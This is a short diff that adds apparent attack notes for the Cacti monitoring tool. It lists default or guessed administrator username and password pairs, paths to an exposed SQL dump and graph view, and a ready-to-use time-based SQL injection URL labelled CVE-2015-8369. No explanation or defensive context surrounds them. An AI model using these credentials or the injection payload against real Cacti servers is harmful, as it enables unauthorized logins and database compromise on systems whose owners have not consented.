@@ -1,0 +1,14 @@
+admin/admin123!@#
+admin/admin
+admin/cacti
+cacat/cacti
+OP/robust
+guest/admin
+cactimonitor/xinnet123
+
+/cacti/cacti.sql
+/cacti/graph_view.php?action=tree&tree_id=2&leaf_id=8
+
+
+[CVE-2015-8369] Cacti SQL injection in graph.php
+/cacti/graph.php?action=properties&local_graph_id=1&rra_id=1%20and%20benchmark(20000000%2csha1(1))--%20&view_type=&graph_start=1448274676&graph_end=1448360776
